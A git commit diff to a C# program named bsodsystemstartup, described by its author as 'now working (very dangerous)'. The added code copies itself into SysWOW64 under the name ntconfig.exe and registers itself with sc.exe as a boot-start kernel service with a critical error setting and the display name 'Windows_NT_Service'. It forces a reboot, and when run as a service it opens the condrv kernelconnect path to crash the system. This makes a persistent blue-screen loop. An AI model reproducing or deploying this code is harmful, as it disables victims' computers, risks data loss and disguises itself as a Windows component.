d1a639c6a707b8fd2e4d32469f99a4afe73fa9ca
Hippolyte d'Oncieu <hippolyte.doncieu@gmail.com>
2021-02-06 23:17:17 +0100

    updated bsodsystemstartup.exe, now working (very dangerous)

--- bsod/bsodsystemstartup/Program.cs
+++ bsod/bsodsystemstartup/Program.cs
@@ -1,8 +1,5 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.IO;
+using static bsodsystemstartup.Tools;
 
 namespace bsodsystemstartup
 {
@@ -10,13 +7,31 @@ namespace bsodsystemstartup
     {
         static void Main(string[] args)
         {
+            static bool RunningAsService()
+            {
+                var p = ParentProcessUtilities.GetParentProcess();
+                return (p != null && p.ProcessName == "services");
+            }
+            //if (RunningAsService()) File.Copy("\\\\.\\globalroot\\device\\condrv\\kernelconnect", "\\\\.\\globalroot\\device\\condrv\\kernelconnect");
+            if (RunningAsService()) RunCmd("\\\\.\\globalroot\\device\\condrv\\kernelconnect");
+
+            string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+            File.Copy(src, "C:\\Windows\\SysWOW64\\ntconfig.exe");
+            RunCmd("sc.exe create ntboot64 binpath= C:\\Windows\\SysWOW64\\ntconfig.exe type= kernel start= boot error= critical displayname= Windows_NT_Service");
+            System.Diagnostics.Process.Start("shutdown.exe", "-r -f -t 0");
+        }
+        private static void RunCmd(string cmd)
+        {
             System.Diagnostics.Process process = new System.Diagnostics.Process();
-            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfo.FileName = "cmd.exe";
-            startInfo.Arguments = "/C echo \\\\.\\globalroot\\device\\condrv\\kernelconnect  > \"%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\bsod.bat\" && shutdown –r –f –t 00";
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo
+            {
+                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
+                FileName = "cmd.exe",
+                Arguments = $"/C {cmd}"
+            };
             process.StartInfo = startInfo;
             process.Start();
+            process.WaitForExit();
         }
     }
 }
